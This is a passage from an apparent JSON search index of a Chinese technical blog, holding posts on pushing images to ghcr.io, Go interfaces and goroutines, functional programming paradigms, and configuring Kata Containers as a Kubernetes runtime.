ghcr.io username: ${{ github.repository_owner }} password: ${{ secrets.GHCR_TOKEN }} - name: Push image run: docker push ghcr.io/shaowenchen/documents:latest 这里的 secrets.GHCR_TOKEN 需要在 https://github.com/settings/tokens/new 页面创建。\n然后添加到项目的 Settings 中，设置为 GHCR_TOKEN 变量值。\n4. 部署服务 在示例中，我使用的是 ghcr.io 镜像仓库，如果在国内的服务器上访问不够快，可以更换为阿里云镜像仓库。\n将上面的配置提交之后，GitHub Actions 就会自动进行镜像构建和推送，如下图。\n在个人主页的 Packages 中，可以看到镜像，如下图。\n将镜像改为 Public 之后，就可以免登陆拉取了。下面使用 docker-compose 对服务进行部署。\ndocker-compose.yml\n1 2 3 4 5 6 7 8 9 10 version: \u0026#34;3\u0026#34; services: documents: restart: always container_name: documents image: ghcr.io/shaowenchen/documents:latest ports: - 80:80 - 443:443 执行命令，启动服务：\n1 docker-compose up -d 更新服务时，先拉取镜像，然后停掉服务，再次拉起即可：\n1 2 3 docker-compose pull docker-compose down docker-compose up -d 由于只是一个 Nginx 提供静态文件服务，服务的启停都非常地快。\n","description":"","id":280,"section":"post","tags":["博文","Hexo","镜像","服务","静态"],"title":"使用镜像部署 Hexo 静态页面","uri":"https://www.chenshaowen.com/blog/deploy-static-server-by-docker-image.html"},{"content":"1. Github Container Registry 9 月 1 日，GitHub 宣布 Github Container Registry 开始公测，测试期间提供免费、无限容量的 Docker 镜像仓库服务。\n再也不用担心，docker.io 一言不合清理镜像了。真好真香！\nGitHub 正在以托管代码仓库为切入点，逐步覆盖整个研发工具链，打造一站式 DevOps 平台。项目管理有 Issues 、Projects，包管理有 Packages，CI 有 Actions，知识管理有 Wiki ，覆盖面越来越广。\n接下来应该就是 CD 部分了，提供容器托管服务是个不错的选择。@GitHub\n2. 推送第一个镜像 下面我们来试试推送一个镜像。\n2.1 创建登陆 Token 直接使用 GitHub 的账户密码推送镜像会提示错误:\n1 unauthorized: Your token has not been granted the required scopes to execute this query. The \u0026#39;id\u0026#39; field requires one of the following scopes: [\u0026#39;read:packages\u0026#39;], but your token has only been granted the: [\u0026#39;\u0026#39;] scopes. Please modify your token\u0026#39;s scopes at: https://github.com/settings/tokens. Github Container registry 需要使用 https://github.com/settings/tokens/new 页面创建的 Token 作为密码才可以推送镜像。\n打开上面的链接，勾选 write:packages 和 read:packages ，repo 会自动选中，创建 Token。\n下面以 XXX 代指这里的 Token 值。\n2.2 镜像推送 登陆 1 2 3 4 5 echo \u0026#34;XXX\u0026#34; | docker login ghcr.io -u shaowenchen --password-stdin WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store 新建 Tag 查看镜像列表\n1 2 3 docker images mysql 8.0.11 5dbe5b6313e1 2 years ago 445MB 新建 Tag\n1 docker tag 5dbe5b6313e1 ghcr.io/shaowenchen/mysql 推送 1 2 3 4 5 docker push ghcr.io/shaowenchen/mysql The push refers to repository [ghcr.io/shaowenchen/mysql] ae2d2cded00e: ... latest: digest: sha256:d98a807f255bd60cd7807af6a11f94cd2456a2908a12adb3737088473c1625a2 size: 2828 这样就完成了镜像的推送。但是镜像并不是每个人都可以 pull ，下面接着来看下镜像的可见性管理。\n2.3 可见性管理 推送完成镜像之后，在个人的主页 packages 标签页下面，可以看到镜像列表。\n默认推送的镜像是 Private ，只有授权的账户才可以 pull 。而 Public 镜像可以匿名 pull ，没有限制。\nPrivate 在 Private 镜像的 Packages settings 页面，可以将 Private 镜像改为 Public ，还可以进行授权的管理 Manage Access。\nPublic 需要注意的是在 Public 镜像的 Packages settings 页面，无法修改镜像的可见性，只能删除镜像。\n3. 与 docker.pkg.github.com 的区别 ghcr.io 与 docker.pkg.github.com 类似，都是提供镜像仓库服务，使用一样的鉴权方式。但是也有些不同：\n维度不同 ghcr.io 针对的是账户维度，是以账户为基本对象提供的服务。而 docker.pkg.github.com 针对的是仓库维度，是以仓库为基本对象提供的服务。\n管理粒度不同 docker.pkg.github.com 中的镜像不允许直接删除，只能通过删除仓库的方式，关联删除镜像。\n而在 ghcr.io 中，可以直接完全管理镜像。\n镜像格式不同 对比一下两者的镜像格式：\n1 docker.pkg.github.com/OWNER/REPOSITORY/IMAGE-NAME 1 ghcr.io/OWNER/IMAGE-NAME docker.pkg.github.com 镜像格式形如 docker.pkg.github.com/shaowenchen/pipeline-test/mysql ，在名字中会带上仓库名。而 ghcr.io 提供的 ghcr.io/shaowenchen/mysql 与其他镜像仓库的命名规范更加一致。\n4. 参考 https://docs.github.com/en/packages/using-github-packages-with-your-projects-ecosystem/configuring-docker-for-use-with-github-packages/ https://github.blog/2020-09-01-introducing-github-container-registry/ ","description":"","id":281,"section":"post","tags":["博文","GitHub","镜像","服务"],"title":"终于等到你 - GitHub 镜像仓库服务(ghcr.io)","uri":"https://www.chenshaowen.com/blog/github-container-registry.html"},{"content":"1. 面向接口编程 1.1 特征 面向接口编程，强调的是模块之间通过接口进行交互。首先，调用方指定一组方法签名，然后，由被调用方实现这组方法。\n接口编程与其他编程显著不同的一点是，接口编程关注的是方法，而不是属性。在很多的编程场景中，方法是围绕属性进行定义的。如下图:\n但在接口编程中，恰好相反，方法处于核心位置，而属性可以自由定义，进行扩展。在不同的数据结构上，实现同一个接口。如下图:\n此外，从文字上也可以看到，面向接口编程是以接口为中心的编程范式。\n1.2 优势 模块解耦 通过接口抽象，明确模块之间的依赖关系。模块与模块之间的边界更加清晰，各个模块也更加独立。\n可维护性 Interface 隐藏了具体实现，各个模块只需要保持 Interface 不变，内部逻辑可以自由重构。\n易扩展、易升级 只需要实现相同的一组方法，就可以很方面地对模块进行扩展、升级。\n易测试 在写单元测试时，需要屏蔽外部依赖。而 Interface 非常容易 Mock 。面向接口编程的代码，更加容易编写单元测试。\n2. Go 中的 Interface Go 中的 Interface 是一种聚合了一组方法的类型。\n2.1 声明和实现 通过 interface 关键字，加上一组方法签名，就可以声明一个接口。方法签名指的是，方法的名字、参数、返回值等能够唯一确定一个方法的全部信息。下面声明一个 Animal 的接口:\n1 2 3 type Animal interface{ Call() } Go 中的 Interface 是隐式实现的。不需要指定继承了哪一个 Interface ，只需要在同一个 package 中，某个类型实现了 Interface 的全部方法，就称这个类型为 Interface 的实现。下面这个例子的 Cat 类型实现了 Animal 接口:\n1 2 3 4 5 type Cat struct {} func (c Cat) Call() { // do something } 在使用时，可以声明一个 Aminal 类型的变量，指向 Cat之后，调用接口中的方法。\n1 2 3 var i Animal i = \u0026amp;Cat{} i.Call() 2.2 Receiver 类型 Go 中可以定义 type 上的方法，Receiver 指的就是这个方法接受的类型，例如示例中的 Cat 。\n上面的示例中，使用 i = \u0026amp;Cat{} 和 i = Cat{} 都是可以的，Go 会自动实现转换。除了 Receiver 为指针类型，而赋值为值类型。因为 Go 采用的是值传递，赋值之后，取得的地址指向的是拷贝的地址，而不是预期的数据地址，编译时会报错:\n1 Cat does not implement Animal (Call method has pointer receiver) 内置的类型不能作为 Receiver 。Receiver 分为两种类型，值和指针，也可以混合使用。\n值类型的 Receiver 1 2 3 4 5 6 7 type Dog struct { times int } func (d Dog) Call() { d.times = d.times + 1 // not work } 指针类型的 Receiver 1 2 3 4 5 6 7 type Dog struct { times int } func (d *Dog) Call() { d.times = d.times + 1 // work } 在实现接口时，会遇到这两种类型的选择。传递指针，似乎更加高效，但也意味着操作更危险。在不需要修改数据的场景中，应该尽量采用值 Receiver 。\n2.3 空接口 空接口的特殊性在于，interface{} 可以接受任意类型的值。这个特性看着像是动态语言才有的，但 Go 是一个静态语言。在编译时，Go 会对 Interface 进行严格校验。\n1 2 3 4 5 6 7 8 9 10 11 package main import \u0026#34;fmt\u0026#34; func main() { var i interface{} i = 123 fmt.Println(i) i = \u0026#34;123\u0026#34; fmt.Println(i) } 空接口在接受或者返回不确定类型参数时，非常有用。但不确定的类型，也会带来维护的成本。在项目中，我们应该尽量避免使用空接口，以增强项目的可维护性。\n2.4 类型判断 由于 interface{} 可以接受任意类型的值，在程序运行过程中，很有可能需要知道 Interface 的动态值类型。有两种方法，可以判断类型:\n断言 1 2 3 4 5 6 7 var i interface{} i = Cat{} if _, ok := i.(Cat); ok { fmt.Println(\u0026#34;i is Cat \u0026#34;) } else { fmt.Println(\u0026#34;i is not Cat \u0026#34;) } switch 1 2 3 4 5 6 7 8 9 10 var i interface{} i = Dog{} switch i.(type) { case Cat: fmt.Println(\u0026#34;i is Cat\u0026#34;) case Dog: fmt.Println(\u0026#34;i is Dog\u0026#34;) default: fmt.Println(\u0026#34;i is unknow\u0026#34;) } 需要注意的是，这里的 Cat 和 Dog 值对 Animal 做类型判断时，为 true 。\n3. Interface 的组合 1 2 3 4 5 6 7 8 9 10 11 12 13 14 type Active interface{ Eat() } type Animal interface{ Active Call() } type Cat struct {} func (c Cat) Call() {} func (c *Cat) Eat() {} Interface 中，还可以嵌套其他 Interface 。实现这个 Interface 的类型，需要同时提供全部 Interface 定义的方法。这种技巧在项目中，非常有用。\n","description":"","id":282,"section":"post","tags":["博文","Go","一起来学Go","Interface"],"title":"一起来学 Go --（6）Interface","uri":"https://www.chenshaowen.com/blog/let-us-start-learning-go-6.html"},{"content":"1. Go 中的并发模型 1.1 通信模型 CSP CSP 全称 Communicating Sequential Process ，通信顺序进程，描述的是一种并发通信模型。Process 可以使用很多个 Channel ，而 Channel 不关心谁在使用它，只负责收发数据。\nGo 社区中，有一句非常著名的论断: 不要通过共享内存来通信，要通过通信来共享内存。意思是，不要在 Process 之间传递指针，而应该封装成对象，丢到 Channel 中，等待 Process 的消费。\nCSP 中的 Process/Channel 对应 Go 语言中的 Goroutine/Channel ，是 Go 并发编程的基石。Goroutine 用于执行任务，Channel 用于 Goroutine 任务之间的通信。\n1.2 两级线程模型 用户线程只是用户程序中的一堆数据，内核线程才是系统中的实际线程。用户线程得到调度时，内核线程读取用户线程数据进行执行。\n因此，有必要了解一下用户线程和内核线程的关系，也就是线程模型。根据两者映射关系，可以分为一对一、多对一、多对多三种调度模型。(一个用户线程绑定到多个内核线程的模型，目前没有实际案例。)\n一对一，一个用户线程绑定一个内核线程。借助于内核的调度，可以很方便地实现并发，但是内核线程频繁切换，调度成本很高。多对一，多个用户线程绑定一个内核线程。通过程序逻辑，控制多个线程的调度，但是只绑定了一个内核线程，只是宏观上的并发，不是真正的并行。多对多，多个用户线程绑定多个内核线程。这样可以充分利用多核的运算性能。\n两级线程模型将用户调度和内核调度分开，用户调度只需要关注用户线程与逻辑处理器的调度，内核调度只需要关注逻辑处理器和物理处理器的调度。\n1.3 调度模型 G-P-M Go 能充分利用 CPU 多核性能，很重要的一点就是基于多对多线程模型，实现了 G-P-M 调度模型。有些语言的并发性能，依赖于第三方库，在第三方库中实现了用户线程、协程的调度。但在 Go 语言中，这种调度的能力直接作为语言特性被提供。下图是 Go 调度器的模型：\n先来看下相关的概念：\nG ，Goroutine 每个 Goroutine 对应一个 G 结构体，用于存储 G 运行堆栈、状态，也就是一个执行逻辑。\nP，Processor 逻辑处理器，G 需要绑定到 P 才能被调度，P 向 M 提供内存分配状态、任务队列等上下文环境。\nM，Machine 物理处理器，P 需要绑定到 M 才能被调度。\n调度的过程是这样的，G 创建后全部进入 Global 队列，等待调度。P 找到空闲的 M ，绑定之后，开始执行 Local 队列中的 G 。如果 G 进行系统调用，导致 M 处于阻塞状态，那么 P 将带着 Local 队列进行漂移到其他 M。当 P 的 Local 队列中没有 G 时，会依次从 Global 队列、其他 P 的 Local 队列中获取 G，直到全部 G 执行完成。\n一个 Goruntine 初始内存只要 2KB ，因此只需要很少的资源就可以达到很高的并发量。但其占用的内存可以不断地增长，在 64 位机器上可达 1GB。这样，既保证了启动速度、数量，又兼顾了某些大内存消耗的场景。\n2. 代码中的 Goroutine 和 Channel Goroutine 是实际并发执行的实体。借助 Channel 通信，Go 实现了 Goroutine 之间传递的数据和同步。\n2.1 Goroutine Goroutine 是用协程实现的。什么是协程？协程是一个轻量级的线程，一个执行逻辑。但是这个执行逻辑不是由 OS 调度，在 Go 语言中由 Goroutine 的调度器来管理和调度这些协程。\nG-P-M 模型就是 Goroutine 的调度器的实现模型。下面我们直接看个例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { func(msg string) { fmt.Println(msg) }(\u0026#34;1/3 - direct\u0026#34;) go func(msg string) { fmt.Println(msg) }(\u0026#34;2/3 - goroutine\u0026#34;) time.Sleep(time.Second) fmt.Println(\u0026#34;3/3 - done\u0026#34;) } 通过 go 关键字，就可以很方便的将函数以非阻塞的形式并发执行。如果没有 time.Sleep ，主程序将不会等待打印 2/3 - goroutine ，而直接退出。\n2.2 Channel 的生命周期 创建 Channel 需要使用 make 进行创建，Channel 的零值为 nil。\n1 messages := make(chan string) 写数据 1 2 m := \u0026#34;This is a message\u0026#34; messages \u0026lt;- m 读数据 1 m := \u0026lt;-messages 关闭 Channel 1 close(messages) 在读写数据时，有点类似 Linux 系统中的管道操作。\n2.3 Channel 分类 根据数据流方向，可以将 Channel 分为三种:\n声明 T 类型的双向通道 通常，使用的都是双向通道。\n1 chan T 声明只能发送 T 类型的通道 1 chan\u0026lt;- T 声明只能接受 T 类型的通道 1 \u0026lt;-chan T 根据是否带缓冲区域，Channel 又分为两种：\n不带缓冲，可以看作是同步模式，默认采用这种模式 发送和接收同时发生，当有一方没有就绪时，另一方会处于等待状态。\n1 make(chan T) 带缓冲，可以看作是异步模式 缓冲区未满时，发送和接收是异步的，当缓冲区满时，发送才会阻塞，等待有数据被消费。\n1 make(chan T 100) 在使用完 Channel 之后，需要关闭 Channel 。如果继续发送数据，则会引发 Panic 。但可以继续读取 Channel 中的数据，没有缓冲区的 Channel 返回的是零值，有缓冲区的 Channel 接收完数据之后，也是零值。这保证了，即使 Channel 关闭，Channel 中的数据不会丢失，依然能够得到可靠的逻辑处理。\n3. 通信示例 Channel 通信 在 G-P-M 的示例中，通过 time.Sleep 等待 Goroutine 的完成。但是 Goroutine 的完成时间是不确定的，可能几十毫秒、也有可能几十秒，这种控制方式是不可靠的。\n无缓存的 Channel 可以用于这类通信场景。下面是一个相关的示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import \u0026#34;fmt\u0026#34; func main() { messages := make(chan string) go func() { messages \u0026lt;- \u0026#34;ping\u0026#34; }() msg := \u0026lt;-messages fmt.Println(msg) } 如果 Goroutine 不涉及数据的传输，这里也可以声明一个布尔类型的 Channel ， done := make(chan bool) 。当 Goroutine 完成全部执行逻辑之后，往 done 中写入一个布尔类型即可。\nWaitGroup 控制 Goroutine Go 的优势是高并发，意味着可能同时具有很多个 Goroutine 在执行。那么如果控制多个 Goroutine 的并发行为呢？答案就是 WaitGroup 。一起看下面的示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) func worker(id int, wg *sync.WaitGroup) { defer wg.Done() fmt.Printf(\u0026#34;Worker %d starting\\n\u0026#34;, id) time.Sleep(time.Second) fmt.Printf(\u0026#34;Worker %d done\\n\u0026#34;, id) } func main() { var wg sync.WaitGroup for i := 1; i \u0026lt;= 5; i++ { wg.Add(1) go worker(i, \u0026amp;wg) } wg.Wait() } 这段代码每次执行的结果都不一样，因为并发的同等优先级的Goroutine 执行顺序无法控制。\nWaitGroup 是通过计数器和信号量实现并发控制的。wg.Add 时，计数器 + 1 ；wg.Done() 时，计数器 -1 。\n4. 参考 https://www.cnblogs.com/sparkdev/p/10917536.html https://gobyexample.com/ ","description":"","id":283,"section":"post","tags":["博文","Go","并发","并行","Goroutine","Channel","学习","一起来学Go"],"title":"一起来学 Go --（5）Goroutine 和 Channel","uri":"https://www.chenshaowen.com/blog/let-us-start-learning-go-5.html"},{"content":"1. 什么是编程范式 编程范式是一类典型的编程规范。一方面提供了工程师对实体的建模方法，将物理世界与代码关联起来；另一方面也提供了工程师对代码程序的理解思路。\n编程范式与编程语言属于多对多的关系。一种编程语言中，可能包含多种编程范式，例如，C++ 包含面向过程、面向对象等。一个编程范式，也有可能被多种编程语言实现，例如，JavaScript、Scale、Python 等都支持函数式编程。\n2. 几种常见的编程范式 命令式 一句一句告诉计算机怎么处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func main() { var a int = 1 LOOP: if a \u0026lt; 10 { a++ goto LOOP } fmt.Printf(\u0026#34;a = %d\\n\u0026#34;, a) } 声明式 仅告诉计算机想要什么，常见的 DSL 语言都是声明式的，例如 SQL、HTML 等。\n1 SELECT * FROM Sites WHERE domain=\u0026#39;www.chenshaowen.com\u0026#39; 结构化 拆分模块，借助循环等增加控制逻辑。\n1 2 3 4 5 6 7 8 9 10 11 package main import \u0026#34;fmt\u0026#34; func main() { var a int = 1 for a \u0026lt; 10{ a ++ } fmt.Printf(\u0026#34;a = %d\\n\u0026#34;, a) } 面向过程 基于结构化，强调函数调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import \u0026#34;fmt\u0026#34; func loop(a int) int{ for a \u0026lt; 10 { a ++ } return a } func main() { var a = loop(1) fmt.Printf(\u0026#34;a = %d\\n\u0026#34;, a) } 面向对象 用类抽象实体，用对象表达实体。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/usr/bin/python3 class Parent: def myMethod(self): print(\u0026#39;调用父类方法\u0026#39;) class Child(Parent): def myMethod(self): print(\u0026#39;调用子类方法\u0026#39;) c = Child() # 子类实例 c.myMethod() # 子类调用重写方法 面向切片 将与模块无关的事情，放到外部完成，常见的实践方式是装饰器、中间件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def mydeco(func): print(\u0026#39;do some things\u0026#39;) def wrapper(*args, **kwargs): return func(*args, **kwargs) return wrapper @mydeco def hello(): print(\u0026#39;hello\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: hello() 面向接口 规定一组必须实现的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package main import \u0026#34;fmt\u0026#34; type Duck interface{ ToDuck() } type Dock1 struct{ } func (d Dock1) ToDuck(){ fmt.Println(\u0026#34;ga...\u0026#34;) } func main(){ var d Duck d = new(Dock1) d.ToDuck() } 函数式编程 用无状态的函数组合来描述程序逻辑。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package main import \u0026#34;fmt\u0026#34; func add(a, b int) int { return a + b } func multi(a, b int) int { return a * b } func myCal(a, b func(int, int) int, c, d int) int { return b(a(c, d), a(c, -d)) } func main() { var result = myCal(add, multi, 5, 1) fmt.Println(result) } 3. 为什么选择函数式编程 简化项目状态管理 管理复杂度是软件工程面临的挑战之一。对于工程师来说，管理程序运行的状态是编程的难点。函数式编程，强调的是无状态，除了 IO 处理，不需要维护程序本身的状态。\n更接近人类语言 函数式编程通常会借助声明式范式，以更接近人类语言的描述，告诉计算机做什么。而不是让人去模仿计算机的思考方式，一条指令一条指令地告诉计算机怎么做。\n更适合并发场景 由于函数式编程不维护状态，不存在锁的问题，并发问题可以在编译器、解释器层面解决，大大降低了编写高并发程序的难度。\n喜新厌旧，风格轮换 轮子总在被重新发明，很多思想在计算机发展的早期就已经出现，但不一定总有机会走到普罗大众面前。函数式编程、通信顺序进程等都是如此，包括云计算，风格总在轮换，具有一定的周期性。\n4. 函数式编程的关键字 纯函数 输出仅取决于输入。\n引用透明 函数可以被计算结果替代，而不影响调用它的程序。\n无副作用 不依赖外部状态。\n惰性求值 需要时才进行求值。\nlambda 匿名函数，没有名字的函数。\n柯里化 将多参数函数改造为返回单参数、并能继续接收剩余参数的函数过程。\n高阶函数 接受函数作为参数或者返回函数的函数。\n","description":"","id":284,"section":"post","tags":["博文","函数式编程","Go","编程范式","Python","什么是"],"title":"什么是函数式编程","uri":"https://www.chenshaowen.com/blog/what-is-functional-programming.html"},{"content":"1. Kata 解决什么问题 安全性和隔离性是 Kata Container 显著区别于 Docker Container 的地方。\nKata Container 来源于 Intel Clear Containers 和 Hyper runV 项目的合并。Intel Clear Containers 借助 Intel VT-x 技术使用轻量级虚拟机提供容器，解决安全性问题，同时性能优异。而 Hyper runV 对标的是 Docker 的 runc ，提供容器的运行时，遵循 OCI runtime 规范。\n2. Kubernetes 中的 Kata 2.1 OCI 和 CRI-O OCI 标准是为了避免容器标准被 Docker 独家挟持而出现的。\nCRI 标准将 Kubelet 与运行时解耦，实现 CRI 标准的容器管理程序都可以用于 Pod 创建。\nCRI-O 插件同时实现了 CRI 和 OCI 标准，可以用于替换 Containerd 直接与 runc 等 OCI runtime 对接。\n如下图：\n2.2 Kata 与 Containerd 为了兼容 OCI 标准，Docker 将管理运行时的功能从 Docker Daemon 中剥离出来，形成了 Containerd 。在运行容器时，可以不用 Docker 的 runc ，而替换为 kata-runtime 。\n2.3 Kata 与 Kuberntes 的集成 如下图，Kata 主要替换的是 OCI runtime 层，其他部分与基于 Docker runc 的 Kubernetes 并无差异。同时，基于 kata-runtime 的 Pod 和基于 runc 的 Pod 可以共存于集群之中。\n目前的主要问题是，Kata 不支持 host 网络。而 Kubernetes 中，etcd、nodelocaldns、kube-apiserver、kube-scheduler、metrics-server、node-exporter、kube-proxy、calico、kube-controller-manager 等，也就是 Static Pod 和 Daemonset 都会使用 host 网络。所以在安装部署时，依然使用 runc 作为默认的运行时，而将 kata-runtime 作为可选的运行时给特定的负载使用。\n3. Kubernetes 集群集成 Kata 3.1 安装 Kubernetes 集群 使用 Kubeadm 安装集群非常方便，可以参考之前的文档 使用 Kubeadm 安装 Kubernetes 集群 。\n也可以直接参考官方文档，https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/ 。\n由于，Kata 需要硬件虚拟化支持，IaaS 厂商一般没有开启相关的功能。我使用的是物理机，只能使用国内的网络。下面的脚本，可以用来提前下载相关镜像。\n查询镜像列表 1 2 3 4 5 6 7 8 9 kubeadm config images list k8s.gcr.io/kube-apiserver:v1.17.9 k8s.gcr.io/kube-controller-manager:v1.17.9 k8s.gcr.io/kube-scheduler:v1.17.9 k8s.gcr.io/kube-proxy:v1.17.9 k8s.gcr.io/pause:3.1 k8s.gcr.io/etcd:v3.3.12 k8s.gcr.io/coredns:1.6.9 下载镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 images=( kube-apiserver:v1.17.9 kube-controller-manager:v1.17.9 kube-scheduler:v1.17.9 kube-proxy:v1.17.9 pause:3.1 etcd:v3.3.12 coredns:1.6.9 ) for imageName in ${images[@]} ; do docker pull registry.cn-beijing.aliyuncs.com/google_containers/$imageName docker tag registry.cn-beijing.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageName docker rmi registry.cn-beijing.aliyuncs.com/google_containers/$imageName done 查看安装的 Kubernetes 版本 1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.9\u0026#34;, GitCommit:\u0026#34;4fb7ed12476d57b8437ada90b4f93b17ffaeed99\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:18:16Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.9\u0026#34;, GitCommit:\u0026#34;4fb7ed12476d57b8437ada90b4f93b17ffaeed99\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:10:45Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 3.2 安装 Kata 命令行工具 以 CentOS 操作系统为例：\n1 2 3 4 5 6 source /etc/os-release yum -y install yum-utils ARCH=$(arch) BRANCH=\u0026#34;${BRANCH:-master}\u0026#34; yum-config-manager --add-repo \u0026#34;http://download.opensuse.org/repositories/home:/katacontainers:/releases:/${ARCH}:/${BRANCH}/CentOS_${VERSION_ID}/home:katacontainers:releases:${ARCH}:${BRANCH}.repo\u0026#34; yum -y install kata-runtime kata-proxy kata-shim 3.3 检测硬件是否支持 Kata Kata 对硬件的要求需要满足以下任意条件：\nIntel VT-x technology. ARM Hyp mode (virtualization extension). IBM Power Systems. IBM Z mainframes. 安装完 kata-runtime 之后，执行检测命令：\n1 2 3 4 kata-runtime kata-check System is capable of running Kata Containers System can currently create Kata Containers 这里的输出表示，运行环境支持 Kata Containers 。\n3.4 配置并测试 Docker 配置 kata-runtime 参数 1 vim /etc/docker/daemon.json 新增如下内容，默认依然使用 runc，但是通过指定 runtime 参数可以使用 Kata 。\n1 2 3 4 5 6 7 { \u0026#34;runtimes\u0026#34;: { \u0026#34;kata-runtime\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/usr/bin/kata-runtime\u0026#34; } } } 重启 Docker 服务 1 2 systemctl daemon-reload systemctl restart docker 测试 Kata 是否安装成功 1 2 3 docker run --runtime=kata-runtime busybox uname -a Linux 249a23f53475 5.4.60-65.1.container #1 SMP Thu Jan 1 00:00:00 UTC 1970 x86_64 GNU/Linux 1 2 3 docker run busybox uname -a Linux b4812ed8990c 3.10.0-1127.el7.x86_64 #1 SMP Tue Mar 31 23:36:51 UTC 2020 x86_64 GNU/Linux kata-runtime 容器使用的内核版本与宿主机不同，这就说明 kata-runtime 配置成功了。\n3.5 配置 Kubelet 新增配置文件 1 2 3 4 5 mkdir -p /etc/systemd/system/kubelet.service.d/ cat \u0026lt;\u0026lt; EOF | sudo tee /etc/systemd/system/kubelet.service.d/0-containerd.conf [Service] Environment=\u0026#34;KUBELET_EXTRA_ARGS=--container-runtime=remote --runtime-request-timeout=15m --container-runtime-endpoint=unix:///run/containerd/containerd.sock\u0026#34; EOF 重启生效 1 2 systemctl daemon-reload systemctl restart kubelet 这里使用的是 containerd 。如果使用 CRI-O ，配置会不一样。\n3.6 给 Kubernetes 提供 kata-runtime 通过直接创建 Container 可以使用 kata-runtime 。但在集群中，我们该如何告诉 Kubernetes 哪些负载需要使用 kata-runtime 呢？根据不同的版本，Kata 提供了不同的方式。\n首先都需要生成 containerd 配置文件\n1 containerd config default \u0026gt; /etc/containerd/config.toml RuntimeClass 的方式 这种方式对相关组件版本有要求：\nKata Containers v1.5.0 or above (including 1.5.0-rc) Containerd v1.2.0 or above Kubernetes v1.12.0 or above 在 config.toml 配置文件中，增加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 [plugins.cri.containerd] no_pivot = false [plugins.cri.containerd.runtimes] [plugins.cri.containerd.runtimes.runc] runtime_type = \u0026#34;io.containerd.runc.v1\u0026#34; [plugins.cri.containerd.runtimes.runc.options] NoPivotRoot = false NoNewKeyring = false ShimCgroup = \u0026#34;\u0026#34; IoUid = 0 IoGid = 0 BinaryName = \u0026#34;runc\u0026#34; Root = \u0026#34;\u0026#34; CriuPath = \u0026#34;\u0026#34; SystemdCgroup = false [plugins.cri.containerd.runtimes.kata] runtime_type = \u0026#34;io.containerd.kata.v2\u0026#34; [plugins.cri.containerd.runtimes.katacli] runtime_type = \u0026#34;io.containerd.runc.v1\u0026#34; [plugins.cri.containerd.runtimes.katacli.options] NoPivotRoot = false NoNewKeyring = false ShimCgroup = \u0026#34;\u0026#34; IoUid = 0 IoGid = 0 BinaryName = \u0026#34;/usr/bin/kata-runtime\u0026#34; Root = \u0026#34;\u0026#34; CriuPath = \u0026#34;\u0026#34; SystemdCgroup = false 这里 [plugins.cri.containerd.runtimes.kata] 中的 kata 将被作为 RuntimeClass handler 关键字。\n使用 untrusted_workload_runtime 的方式 对于不符合上述版本要求的环境，可以使用之前的方式。\n在配置文件中新增如下内容：\n1 2 3 [plugins.cri.containerd.untrusted_workload_runtime] runtime_type = \u0026#34;io.containerd.runtime.v1.linux\u0026#34; runtime_engine = \u0026#34;/usr/bin/kata-runtime\u0026#34; 最后，都需要重启 containerd。\n1 2 containerd systemctl daemon-reload systemctl restart containerd 4. 使用 kata-runtime 4.1 RuntimeClass 方式 创建 RuntimeClass kata-runtime.yaml\n1 2 3 4 5 kind: RuntimeClass apiVersion: node.k8s.io/v1beta1 metadata: name: kata-containers handler: kata 也可以为 runc 创建 RuntimeClass\n1 2 3 4 kubectl get runtimeclass NAME CREATED AT kata-containers 2020-08-30 创建负载 kata-pod.yaml 1 2 3 4 5 6 7 8 9 10 11 apiVersion: v1 kind: Pod metadata: name: kata-nginx spec: runtimeClassName: kata-containers containers: - name: nginx image: nginx ports: - containerPort: 80 1 kubectl apply -f kata-pod.yaml 查看负载 1 kata-runtime list 4.2 untrusted_workload_runtime 的方式 untrusted_workload_runtime 使用 annotations 告诉 Kubernetes 集群哪些负载需要使用 kata-runtime。\n1 2 annotations: io.kubernetes.cri.untrusted-workload: \u0026#34;true\u0026#34; 下面是一个示例 kata-pod-untrusted.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 apiVersion: v1 kind: Pod metadata: name: kata-nginx-untrusted annotations: io.kubernetes.cri.untrusted-workload: \u0026#34;true\u0026#34; spec: containers: - name: nginx image: nginx ports: - containerPort: 80 1 kubectl apply -f kata-pod-untrusted.yaml 5. 参考 https://github.com/kata-containers/documentation/blob/master/install/centos-installation-guide.md 